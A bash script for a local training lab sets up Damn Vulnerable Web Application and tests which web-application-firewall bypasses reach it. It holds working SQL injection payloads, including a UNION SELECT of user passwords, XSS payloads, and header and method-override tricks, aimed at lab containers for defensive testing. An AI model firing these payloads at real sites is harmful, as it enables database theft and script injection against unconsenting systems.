#!/usr/bin/env bash
#
# WAF Lab — setup + test matrix
# Usage:  ./check.sh          (setup DVWA, then run tests)
#         ./check.sh --tests   (skip setup, tests only)
#
set -uo pipefail

DIR="$(cd "$(dirname "$0")" && pwd)"
JAR="$DIR/.dvwa-cookies.txt"
OUT="$DIR/evidence"

# Load lab config if present (same file docker compose uses)
if [ -f "$DIR/.env" ]; then
  set -a
  # shellcheck disable=SC1091
  . "$DIR/.env"
  set +a
fi

LAB_HOST="${LAB_HOST:-127.0.0.1}"
DVWA="http://${LAB_HOST}:${DVWA_PORT:-8080}"
WAF="http://${LAB_HOST}:${WAF_PORT:-8081}"
ECHO="http://${LAB_HOST}:${ECHO_PORT:-8082}"
WAF_ECHO="http://${LAB_HOST}:${WAF_ECHO_PORT:-8083}"
WEAK="http://${LAB_HOST}:${WEAK_PORT:-8084}"
WEAK_ECHO="http://${LAB_HOST}:${WEAK_ECHO_PORT:-8085}"

mkdir -p "$OUT"

say()  { printf '\n\033[1;36m== %s ==\033[0m\n' "$*"; }
code() { curl -s -o /dev/null -w '%{http_code}' --max-time 15 "$@"; }
row()  { printf '%-52s -> %s\n' "$1" "$2"; }

wait_for() {
  local url="$1" name="$2"
  for _ in $(seq 1 90); do
    if [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 "$url" 2>/dev/null)" != "000" ]; then
      return 0
    fi
    sleep 1
  done
  echo "TIMEOUT waiting for $name ($url)" >&2
  return 1
}

toggle_token() {  # $1 = html file
  grep -oE "name=['\"]user_token['\"] value=['\"][^'\"]+" "$1" 2>/dev/null \
    | head -1 | sed -E "s/.*value=['\"]//"
}

setup_dvwa() {
  say "Initializing DVWA (first run only; safe to re-run)"
  curl -s -c "$JAR" "$DVWA/setup.php" -o "$OUT/setup.html"
  local token; token="$(toggle_token "$OUT/setup.html")"
  curl -s -b "$JAR" -c "$JAR" \
    --data-urlencode 'create_db=Create / Reset Database' \
    --data-urlencode "user_token=$token" \
    "$DVWA/setup.php" -o /dev/null
  sleep 3

  curl -s -b "$JAR" -c "$JAR" "$DVWA/login.php" -o "$OUT/login.html"
  token="$(toggle_token "$OUT/login.html")"
  if [ -n "$token" ]; then
    curl -s -b "$JAR" -c "$JAR" \
      --data-urlencode 'username=admin' \
      --data-urlencode 'password=password' \
      --data-urlencode 'Login=Login' \
      --data-urlencode "user_token=$token" \
      "$DVWA/login.php" -o /dev/null
  fi

  curl -s -b "$JAR" -c "$JAR" "$DVWA/security.php" -o "$OUT/security.html"
  token="$(toggle_token "$OUT/security.html")"
  if [ -n "$token" ]; then
    curl -s -b "$JAR" -c "$JAR" \
      --data-urlencode 'security=low' \
      --data-urlencode 'seclev_submit=Submit' \
      --data-urlencode "user_token=$token" \
      "$DVWA/security.php" -o /dev/null
  fi

  local who
  who="$(curl -s -b "$JAR" "$DVWA/index.php" | grep -o 'Welcome to Damn Vulnerable Web Application' | head -1)"
  if [ -n "$who" ]; then
    echo "DVWA login: OK (admin/password, security=low)"
  else
    echo "DVWA login: UNVERIFIED — buksan mo http://127.0.0.1:8080 manually"
  fi
}

run_tests() {
  say "T0 — Baseline (direct backend, walang WAF)"
  row "DVWA SQLi page, id=1"                 "$(code -b "$JAR" "$DVWA/vulnerabilities/sqli/?id=1&Submit=Submit")"
  row "ECHO /get?q=hello"                    "$(code "$ECHO/get?q=hello")"

  say "T1 — DVWA through WAF: benign vs blocked"
  row "WAF SQLi page, id=1 (benign)"         "$(code -b "$JAR" "$WAF/vulnerabilities/sqli/?id=1&Submit=Submit")"
  row "WAF SQLi, raw 1' OR '1'='1"           "$(code -b "$JAR" "$WAF/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit")"

  say "T2 — Payload-level bypass attempts (SQLi)"
  row "case variation: 1' oR '1'='1"         "$(code -b "$JAR" "$WAF/vulnerabilities/sqli/?id=1%27%20oR%20%271%27%3D%271&Submit=Submit")"
  row "comment injection: 1'/**/OR/**/'1'='1" "$(code -b "$JAR" "$WAF/vulnerabilities/sqli/?id=1%27%2F**%2FOR%2F**%2F%271%27%3D%271&Submit=Submit")"
  row "whitespace: 1'%09OR%09'1'='1"          "$(code -b "$JAR" "$WAF/vulnerabilities/sqli/?id=1%27%09OR%09%271%27%3D%271&Submit=Submit")"
  row "double-encode quote: 1%2527 OR ..."    "$(code -b "$JAR" "$WAF/vulnerabilities/sqli/?id=1%2527%2520OR%2520%25271%2527%253D%25271&Submit=Submit")"

  say "T3 — HPP (parameter pollution)"
  row "id=1 & id=1' OR '1'='1 (WAF)"          "$(code -b "$JAR" "$WAF/vulnerabilities/sqli/?id=1&id=1%27%20OR%20%271%27%3D%271&Submit=Submit")"
  row "ECHO HPP: ?q=safe&q=<script>alert(1)</script>" \
      "$(code -b "$JAR" "$WAF_ECHO/get?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E")"

  say "T4 — XSS through WAF"
  row "benign name=Juan"                      "$(code -b "$JAR" "$WAF/vulnerabilities/xss_r/?name=Juan")"
  row "raw <script>alert(1)</script>"         "$(code -b "$JAR" "$WAF/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E")"
  row "svg onload"                            "$(code -b "$JAR" "$WAF/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert(1)%3E")"
  row "img onerror"                           "$(code -b "$JAR" "$WAF/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E")"

  say "T5 — Method / header tricks (ECHO service)"
  row "ECHO GET"                              "$(code "$ECHO/method")"
  row "WAF  GET"                              "$(code "$WAF_ECHO/method")"
  row "WAF  gEt (case)"                       "$(code -X gEt "$WAF_ECHO/method")"
  row "WAF  X-HTTP-Method-Override: PUT"      "$(code -X POST -H 'X-HTTP-Method-Override: PUT' "$WAF_ECHO/method")"
  row "WAF  X-Forwarded-For: 127.0.0.1"       "$(code -H 'X-Forwarded-For: 127.0.0.1' "$WAF_ECHO/get")"
  row "WAF  X-Forwarded-Host: attacker.local" "$(code -H 'X-Forwarded-Host: attacker.local' "$WAF_ECHO/get")"

  say "T6 — Protocol variants"
  row "WAF  HTTP/1.1"                         "$(code --http1.1 "$WAF_ECHO/get")"
  row "WAF  HTTP/2"                           "$(code --http2 "$WAF_ECHO/get")"

  say "T7 — WeakWAF (naive literal rules): dito dapat may BYPASS"
  row "baseline id=1"                          "$(code -b "$JAR" "$WEAK/vulnerabilities/sqli/?id=1&Submit=Submit")"
  row "literal block: 1' OR '1'='1"            "$(code -b "$JAR" -G --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' "$WEAK/vulnerabilities/sqli/")"
  row "BYPASS case: 1' oR '1'='1"              "$(code -b "$JAR" -G --data-urlencode "id=1' oR '1'='1" --data-urlencode 'Submit=Submit' "$WEAK/vulnerabilities/sqli/")"
  row "BYPASS comment: 1'/**/OR/**/'1'='1"     "$(code -b "$JAR" -G --data-urlencode "id=1'/**/OR/**/'1'='1" --data-urlencode 'Submit=Submit' "$WEAK/vulnerabilities/sqli/")"
  row "BYPASS union case: UnIoN SeLeCt"        "$(code -b "$JAR" -G --data-urlencode "id=1' UnIoN SeLeCt user,password FROM users-- -" --data-urlencode 'Submit=Submit' "$WEAK/vulnerabilities/sqli/")"
  row "BYPASS HPP: id=1 & id=<payload>"        "$(code -b "$JAR" -G --data-urlencode "id=1" --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' "$WEAK/vulnerabilities/sqli/")"
  row "XSS literal block: <script>"            "$(code -b "$JAR" -G --data-urlencode 'name=<script>alert(1)</script>' "$WEAK/vulnerabilities/xss_r/")"
  row "BYPASS XSS case: <ScRiPt>"              "$(code -b "$JAR" -G --data-urlencode 'name=<ScRiPt>alert(1)</ScRiPt>' "$WEAK/vulnerabilities/xss_r/")"
  row "BYPASS XSS alt tag: <img onerror>"      "$(code -b "$JAR" -G --data-urlencode 'name=<img src=x onerror=alert(1)>' "$WEAK/vulnerabilities/xss_r/")"
  row "BYPASS method: WEAK_ECHO -X PUT"        "$(code -X PUT "$WEAK_ECHO/method")"
  row "BYPASS header: X-Forwarded-For"         "$(code -H 'X-Forwarded-For: 127.0.0.1' "$WEAK_ECHO/get")"

  say "T7b — Patunay na umabot sa app (SQLi row count)"
  local b rows
  b="$(curl -s -b "$JAR" -G --data-urlencode "id=1' oR 1=1-- -" --data-urlencode 'Submit=Submit' "$WEAK/vulnerabilities/sqli/")"
  rows="$(printf '%s' "$b" | grep -o 'First name:' | wc -l | tr -d ' ')"
  echo "  case-variation payload -> rows returned: $rows (benign id=1 = 1 row)"

  say "Resultang legend"
  echo "  200/302 = umabot sa backend (possible bypass)"
  echo "  403     = hinarang ng WAF (expected sa malicious payload)"
  echo "  500/502 = app error / backend unreachable"
  echo "  000     = connection failure / timeout"
}

inspect_logs() {
  say "Huling 20 WAF log lines (rule IDs dito makikita)"
  ( cd "$DIR" && docker compose logs --tail=20 waf 2>/dev/null ) || true
  echo
  echo "Full logs:   cd $DIR && docker compose logs waf"
  echo "Follow logs: cd $DIR && docker compose logs -f waf"
}

main() {
  say "Waiting for services"
  wait_for "$DVWA/" "DVWA" || exit 1
  wait_for "$ECHO/get" "echo" || exit 1
  wait_for "$WAF/" "WAF" || exit 1
  wait_for "$WAF_ECHO/get" "WAF-echo" || exit 1
  wait_for "$WEAK/" "WeakWAF" || exit 1
  wait_for "$WEAK_ECHO/get" "WeakWAF-echo" || exit 1
  echo "All services up."

  [ "${1:-}" = "--tests" ] || setup_dvwa
  run_tests
  inspect_logs

  say "Evidence"
  echo "Saved helper files in: $OUT"
}

main "$@"
